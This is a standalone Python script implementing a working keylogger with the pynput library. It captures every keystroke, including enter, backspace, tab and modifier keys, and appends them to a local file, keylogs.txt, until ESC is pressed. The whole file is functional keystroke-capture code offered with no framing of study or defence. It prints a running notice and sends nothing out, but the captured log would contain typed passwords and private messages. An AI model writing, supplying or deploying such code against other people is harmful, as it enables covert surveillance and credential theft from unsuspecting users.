import pynput
from pynput.keyboard import Key, Listener

# File to save the logs
log_file = "keylogs.txt"

# Function to log the keys to the file
def log_keystroke(key):
    try:
        # Try to record alphanumeric keys as is
        with open(log_file, "a") as f:
            f.write(str(key.char))  # key.char for regular characters
    except AttributeError:
        # Special keys like space, enter, etc.
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        elif key == Key.backspace:
            with open(log_file, "a") as f:
                f.write("[BACKSPACE]")
        elif key == Key.tab:
            with open(log_file, "a") as f:
                f.write("[TAB]")
        else:
            # Record other special keys like shift, ctrl, etc.
            with open(log_file, "a") as f:
                f.write(f"[{str(key)}]")

# Function to stop logging when escape is pressed
def stop_logging(key):
    if key == Key.esc:
        return False  # Stop the listener

# Main function to set up the keylogger
def main():
    print("Keylogger is running... (Press ESC to stop)")
    
    # Create a listener for key presses
    with Listener(on_press=log_keystroke, on_release=stop_logging) as listener:
        listener.join()

if __name__ == "__main__":
    main()
